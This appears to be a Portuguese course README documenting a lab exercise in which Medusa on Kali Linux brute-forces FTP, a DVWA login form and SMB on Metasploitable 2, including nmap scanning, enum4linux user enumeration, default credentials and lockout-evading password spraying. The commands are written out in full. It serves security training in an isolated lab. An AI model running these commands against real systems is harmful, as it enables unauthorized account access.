# DESAFIO-DIO-KALI-MEDUSA-
Projeto: Auditoria de Segurança com Kali Linux + Medusa - Simulação de ataques de força bruta em ambiente controlado

OBJETIVO GERAL
Configurar um ambiente vulnerável e executar ataques simulados com a ferramenta Medusa no Kali Linux, aplicando técnicas de força bruta em serviços como:
FTP (Metasploitable 2)
Formulário web vulnerable (DVWA)
SMB (Metasploitable 2)

1. Configuração do Ambiente
  -Máquinas Virtuais
    Foram utilizadas 2 máquinas no VirtualBox:

  Sistema	             Função	       Interface
  Kali Linux	        Atacante	     Host-only
  Metasploitable 2	   Alvo	         Host-only

  -Rede
    Tipo: Host-Only
    IPs obtidos automaticamente via DHCP
    Kali Linux → 192.168.56.102
    Metasploitable 2 → 192.168.56.101

2️. Verificação de Conectividade
  ping -c 3 192.168.56.101

3. Verificação de portas abertas
   nmap -sV -p 21,22,80,445,139,8080 192.168.56.101

4. Ataque 1 — Força bruta em FTP (Metasploitable 2)
  -Serviço alvo
    FTP - porta 21
  -Metasploitable possui o usuário padrão msfadmin/msfadmin

5. Execução do ataque com Medusa
   medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

   -Explicação
      -h: host
      -U: wordlist de usuários
      -P: wordlist de senhas
      -M ftp: módulo para FTP

6. Ataque 2 — Força bruta em formulário WEB (DVWA)
  -Preparação
    Após acessar DVWA:
    Security Level → LOW
   
  -Serviço rodando em:
    http://192.168.56.101/dvwa/login.php
  -Coleta de parâmetros
    Usei o Inspecionar:
    POST típico:
      username=admin
      password=1234
      Login=Login

  Medusa para Web Form
    medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
    -m PAGE:'/dvwa/login.php' \
    -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
    -m 'FAIL=Login failed' -t 6

7. Ataque 3 — Password Spraying em SMB (Metasploitable 2)
   
  -Enumeração de usuários
     Primeiro enumerei usuários via enum4linux:
      enum4linux -U 192.168.56.101
  -Exemplo de usuários encontrados:
    msfadmin
    user
    service
  -Criado wordlist com usuarios encontrado e possiveis senhas
    echo -e 'user\nmsfadmin\nservice' > smb_users.txt
    echo -e 'password\n123456\nwelcome123\nmsfadmin' > senhas_spray.txt

 Medusa para SMB: (Ataque de senhas para usuários diferentes, evitando bloqueio de tentativas para 1     usuários)
   medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

